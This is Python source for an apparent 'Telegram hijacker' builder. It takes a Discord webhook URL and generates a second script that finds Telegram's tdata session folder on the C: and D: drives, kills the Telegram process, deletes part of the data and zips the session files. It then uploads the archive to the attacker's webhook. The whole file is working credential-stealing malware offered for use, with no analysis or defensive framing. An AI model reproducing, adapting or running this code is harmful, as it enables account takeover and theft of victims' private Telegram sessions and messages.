import os
import sys

def create_python_file(hook):
    template = f"""
import os
import time
from discord_webhook import DiscordWebhook, DiscordEmbed
from zipfile import ZipFile, ZIP_DEFLATED
import zipfile
import shutil

#search folder
folder_name = 'tdata'

search_pathD = 'D:\\\\'
search_pathC = 'C:\\\\'

found = False
for root, dirs, files in os.walk(search_pathD):
    if folder_name in dirs:
        found = True
        full_path = os.path.join(root, folder_name)

for root, dirs, files in os.walk(search_pathC):
    if folder_name in dirs:
        found = True
        full_path = os.path.join(root, folder_name)

home = os.path.expanduser('~')
user = os.path.join(full_path) 
hook = "{hook}"
#search folder end

def task_kill():
    os.system('taskkill /f /im Telegram.exe')

def delete_fold():
    folder_path = os.path.join(user, 'user_data')
    time.sleep(2)
    if os.path.isdir(folder_path) == True:
        shutil.rmtree(folder_path)

def archivation():
    with zipfile.ZipFile("tdata.zip", 'w', ZIP_DEFLATED, compresslevel=9) as archive:
        for root, dirs, files in os.walk(user):
            for file in files:
                file_path = os.path.join(root, file)
                archive.write(file_path, os.path.relpath(file_path, os.path.join(user, '..')))

def discord_send():
    webhook = DiscordWebhook(url=hook)
    with open("tdata.zip", 'rb') as f:
        webhook.add_file(file=f.read(), filename='tdata_session.zip')
    webhook.execute()

def main():
    task_kill()
    delete_fold()
    archivation()
    discord_send()
main()
    """


    with open('generated_file.py', 'w') as f:
        f.write(template)

def main():

    RED = "\33[31m"
    logo= f"""
    {RED}
    ▄▄▄█████▓▓█████  ██▓    ▓█████   ▄████  ██▀███  ▄▄▄      ███▄ ▄███▓      ██░ ██  ██▓ ▄▄▄██▀▀▀▄▄▄      ▄████▄   ██ ▄█▀▓█████  ██▀███     
    ▓  ██▒ ▓▒▓█   ▀ ▓██▒    ▓█   ▀  ██▒ ▀█▒▓██ ▒ ██▒████▄   ▓██▒▀█▀ ██▒     ▓██░ ██▒▓██▒   ▒██  ▒████▄   ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒   
    ▒ ▓██░ ▒░▒███   ▒██░    ▒███   ▒██░▄▄▄░▓██ ░▄█ ▒██  ▀█▄ ▓██    ▓██░     ▒██▀▀██░▒██▒   ░██  ▒██  ▀█▄ ▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒   
    ░ ▓██▓ ░ ▒▓█  ▄ ▒██░    ▒▓█  ▄ ░▓█  ██▓▒██▀▀█▄ ░██▄▄▄▄██▒██    ▒██      ░▓█ ░██ ░██░▓██▄██▓ ░██▄▄▄▄██▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄     
      ▒██▒ ░ ░▒████▒░██████▒░▒████▒░▒▓███▀▒░██▓ ▒██▒▓█   ▓██▒██▒   ░██▒     ░▓█▒░██▓░██░ ▓███▒   ▓█   ▓██▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒   
      ▒ ░░   ░░ ▒░ ░░ ▒░▓  ░░░ ▒░ ░ ░▒   ▒ ░ ▒▓ ░▒▓░▒▒   ▓▒█░ ▒░   ░  ░      ▒ ░░▒░▒░▓   ▒▓▒▒░   ▒▒   ▓▒█░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░   
        ░     ░ ░  ░░ ░ ▒  ░ ░ ░  ░  ░   ░   ░▒ ░ ▒░ ▒   ▒▒ ░  ░      ░      ▒ ░▒░ ░ ▒ ░ ▒ ░▒░    ▒   ▒▒ ░ ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░   
      ░         ░     ░ ░      ░   ░ ░   ░   ░░   ░  ░   ▒  ░      ░         ░  ░░ ░ ▒ ░ ░ ░ ░    ░   ▒  ░        ░ ░░ ░    ░     ░░   ░    
                ░  ░    ░  ░   ░  ░      ░    ░          ░  ░      ░         ░  ░  ░ ░   ░   ░        ░  ░ ░      ░  ░      ░  ░   ░        
                                                                                                     ░                                  """
    print(logo)

    hook = input("[Enter web hook url]: ")

    create_python_file(hook)
    print("File 'generated_file.py' generated!")

def set_def_color():
    sys.stdout.write("\033[0m")

if __name__ == "__main__":
    main()

set_def_color()
